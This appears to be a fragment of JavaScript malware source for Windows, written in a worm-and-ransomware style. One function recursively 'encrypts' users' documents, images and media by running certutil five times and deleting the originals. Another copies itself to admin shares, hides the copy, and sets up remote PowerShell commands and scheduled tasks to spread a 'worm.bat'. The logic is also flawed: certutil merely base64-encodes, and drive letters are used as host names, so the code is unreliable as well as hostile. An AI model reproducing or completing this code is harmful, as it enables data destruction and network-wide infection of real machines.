// Function to encrypt files with quintuple encryption
function encryptfiles() {
    const files = fs.readdirSync(targetdir);
    files.forEach(file => {
        const filePath = path.join(targetdir, file);
        if (fs.statSync(filePath).isDirectory()) {
            encryptDirectory(filePath);
        }
    });
}

function encryptDirectory(dir) {
    const files = fs.readdirSync(dir);
    files.forEach(file => {
        const filePath = path.join(dir, file);
        if (fs.statSync(filePath).isFile()) {
            const ext = path.extname(filePath).toLowerCase();
            if (['.txt', '.docx', '.xlsx', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip'].includes(ext)) {
                encryptFile(filePath);
            }
        }
    });
}

function encryptFile(filePath) {
    const encryptedPath = filePath + '.enc';
    exec(`certutil -encode "${filePath}" "${encryptedPath}"`, (error) => {
        if (error) {
            console.error('Error encrypting file:', error);
        } else {
            fs.unlinkSync(filePath);
            const nextEncryptedPath = encryptedPath + '2';
            exec(`certutil -encode "${encryptedPath}" "${nextEncryptedPath}"`, (error) => {
                if (error) {
                    console.error('Error encrypting file:', error);
                } else {
                    fs.unlinkSync(encryptedPath);
                    const nextNextEncryptedPath = nextEncryptedPath + '3';
                    exec(`certutil -encode "${nextEncryptedPath}" "${nextNextEncryptedPath}"`, (error) => {
                        if (error) {
                            console.error('Error encrypting file:', error);
                        } else {
                            fs.unlinkSync(nextEncryptedPath);
                            const nextNextNextEncryptedPath = nextNextEncryptedPath + '4';
                            exec(`certutil -encode "${nextNextEncryptedPath}" "${nextNextNextEncryptedPath}"`, (error) => {
                                if (error) {
                                    console.error('Error encrypting file:', error);
                                } else {
                                    fs.unlinkSync(nextNextEncryptedPath);
                                    const finalEncryptedPath = nextNextNextEncryptedPath + '5';
                                    exec(`certutil -encode "${nextNextNextEncryptedPath}" "${finalEncryptedPath}"`, (error) => {
                                        if (error) {
                                            console.error('Error encrypting file:', error);
                                        } else {
                                            fs.unlinkSync(nextNextNextEncryptedPath);
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            });
        }
    });
}

// Function to spread over the network with enhanced stealth and additional methods
function spreadnetwork() {
    exec('wmic logicaldisk where "drivetype=3" get deviceid /format:list', (error, stdout, stderr) => {
        if (error) {
            console.error('Error getting logical disks:', error);
        } else {
            const drives = stdout.split('\n').filter(line => line.includes(':'));
            drives.forEach(drive => {
                const driveLetter = drive.split(':')[0];
                if (driveLetter !== process.env.currentdrive) {
                    const targetPath = `\\\\${driveLetter}\\C$\\${path.basename(process.argv[0])}`;
                    exec(`xcopy /y /q "${process.argv[0]}" "${targetPath}"`, (error) => {
                        if (error) {
                            console.error('Error copying file:', error);
                        } else {
                            exec(`attrib +h "${targetPath}"`, (error) => {
                                if (error) {
                                    console.error('Error setting attributes:', error);
                                } else {
                                    exec(`powershell -Command "Invoke-Command -ComputerName ${driveLetter} -ScriptBlock {Copy-Item -Path 'C:\\path\\to\\your\\worm.bat' -Destination 'C:\\' -Force}"`, (error) => {
                                        if (error) {
                                            console.error('Error invoking command:', error);
                                        } else {
                                            exec(`powershell -Command "Invoke-Command -ComputerName ${driveLetter} -ScriptBlock {schtasks /create /tn 'NetworkSpreadTask' /tr 'C:\\path\\to\\your\\worm.bat' /sc daily /st 00:00}"`, (error) => {
                                                if (error) {
                                                    console.error('Error creating task:', error);
                                                }
                                            });
                                        }
                                    });
                                }
                            });
                        }
                    });
                }
            });
        }
    });
}

